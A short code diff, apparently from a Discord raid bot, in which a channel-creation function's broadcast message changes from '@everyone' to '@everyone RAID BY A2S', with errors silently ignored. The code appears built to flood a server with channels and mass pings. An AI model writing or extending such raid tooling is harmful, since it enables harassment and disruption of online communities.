@@ -105,7 +105,7 @@ async def createsalons(
                     category=categorie
                 )
                 try:
-                    await channel.send("@everyone")
+                    await channel.send("@everyone RAID BY A2S")
                 except:
                     pass
             except:
